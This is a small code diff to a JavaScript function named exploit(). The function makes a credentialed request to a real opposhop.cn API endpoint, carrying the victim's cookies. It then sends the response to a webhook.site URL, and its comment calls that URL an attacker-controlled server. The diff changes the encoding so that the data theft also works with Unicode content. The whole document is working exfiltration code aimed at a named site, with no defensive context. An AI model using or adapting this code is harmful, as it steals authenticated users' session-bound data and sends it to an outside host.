@@ -13,14 +13,17 @@
     function exploit() {
       fetch("https://www.opposhop.cn/cn/oapi/configs/web/icons/700002", {
         method: "GET",
-        credentials: "include" // sends cookies/session
+        credentials: "include" // include cookies/session
       })
       .then(response => response.text())
       .then(data => {
         document.getElementById("output").textContent = data;
 
+        // Fix: safely encode Unicode before sending
+        let encoded = encodeURIComponent(data);
+
         // Exfiltrate data to attacker-controlled server
-        fetch("https://webhook.site/4b77bece-c255-418a-a371-8f13fa2b6ccb?data=" + btoa(data));
+        fetch("https://webhook.site/4b77bece-c255-418a-a371-8f13fa2b6ccb?data=" + encoded);
       })
       .catch(error => {
         document.getElementById("output").textContent = "Error: " + error;
